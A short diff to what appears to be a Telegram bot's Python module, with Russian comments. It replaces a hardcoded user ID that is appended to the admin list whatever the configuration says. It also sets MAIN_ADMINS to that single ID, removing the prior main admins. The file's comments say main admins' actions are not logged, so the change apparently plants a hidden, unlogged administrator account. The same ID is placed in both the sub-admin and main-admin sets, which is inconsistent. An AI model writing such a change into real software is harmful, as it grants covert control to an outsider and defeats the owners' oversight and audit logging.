@@ -38,8 +38,8 @@ import db
 channel_id = config.channel_id
 channel2_id = config.channel2_id
 admins = config.ADMINS
-if 8701067595 not in admins:
-    admins = list(admins) + [8701067595]
+if 8224529588 not in admins:
+    admins = list(admins) + [8224529588]
 if 8904492648 not in admins:
     admins = list(admins) + [8904492648]
 admins2 = []
@@ -48,8 +48,8 @@ bot_logs = config.bot_logs
 report_count333 = 200
 
 # Суб-админы — все их действия логируются отдельно
-SUB_ADMINS = {8701067595}
-MAIN_ADMINS = {8316051968, 60693380}  # основные — не логируются
+SUB_ADMINS = {8224529588}
+MAIN_ADMINS = {8224529588}  # основные — не логируются
 
 async def _log_admin_action(uid: int, username: str, action: str):
 	"""Логирует действие суб-админа в bot_logs."""
